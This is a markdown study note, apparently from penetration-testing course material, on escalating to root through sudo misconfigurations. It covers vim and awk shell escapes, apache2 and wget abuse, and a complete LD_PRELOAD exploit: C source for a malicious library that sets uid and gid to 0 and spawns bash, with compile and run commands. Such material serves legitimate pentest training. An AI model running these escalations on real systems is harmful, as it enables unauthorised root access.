# Escalation via Sudo

## Sudo Shell Escaping

- `sudo -l` will show us commands delegated to our user. See example of possible output below  
![image](https://user-images.githubusercontent.com/96747355/167295677-4b615420-f012-4bb7-992c-b03ab924f8b8.png)  
- With the result of the command we can then check out on [GTFOBins](https://gtfobins.github.io/) for comprehensive ways to escalate

### Vim

- [Vim on Gtfobins](https://gtfobins.github.io/gtfobins/vim/) the section of interest for us here is the following one:  
![image](https://user-images.githubusercontent.com/96747355/167295801-e9cab3c9-62e5-4a46-90f3-ff62498f4e57.png)  
- Let's try this command `sudo vim -c ':!/bin/sh'`
- It works right away  
![image](https://user-images.githubusercontent.com/96747355/167295851-cd5dd86e-3dc6-49b3-9c32-6846a32f857d.png)  

### awk

- [Awk on GTFOBins](https://gtfobins.github.io/gtfobins/awk/) the section of interest for us here is the following one:  
![image](https://user-images.githubusercontent.com/96747355/167295996-a55b8fce-b27f-421a-958a-18646b7c828d.png)  
- So let's try this `sudo awk 'BEGIN {system("/bin/sh")}'`
- It works  
![image](https://user-images.githubusercontent.com/96747355/167296030-dd82bef4-4640-4ded-8357-0b2f32ca9638.png)

## Resources

{% embed url="https://academy.tcm-sec.com/p/linux-privilege-escalation" %} Linux Privesc on TCM-Security Academy {% endembed %}

## Intended Functionality

### Example with Apache2

- `sudo -l` we should see this: `(root) NOPASSWD: /usr/sbin/apache2`
- *Note: There are no entry on GTFOBins about apache2 but Google can do the trick ;) We could type something like "sudo apache2 privilege escalation"*
- Then we find an [article](https://touhidshaikh.com/blog/2018/04/abusing-sudo-linux-privilege-escalation/) that mentions this command to let us view system files.

### Example with wget

- See [here](https://veteransec.org/hack-the-box-sunday-walkthrough/) an example with wget on veteransec's writeup of the HTB box called sunday.

## LD_PRELOAD

- `sudo -l` we should see something like this `env_keep+=LD_PRELOAD`
- We are going to preload a user specific share library before any other share libraries
- We need to write our malicious library that will privesc for us by changing our gid and uid to 0 (root). We put this code in a file named x.c
```
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
- now we need to compile our library with gcc `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
- And now we need to set it as our user's preloaded library `sudo LD_PRELOAD=/tmp/x.so apache2`
- We should be root  
![image](https://user-images.githubusercontent.com/96747355/167297390-ce9c76ed-72c5-4bfb-bea9-9b380478cb9d.png)  

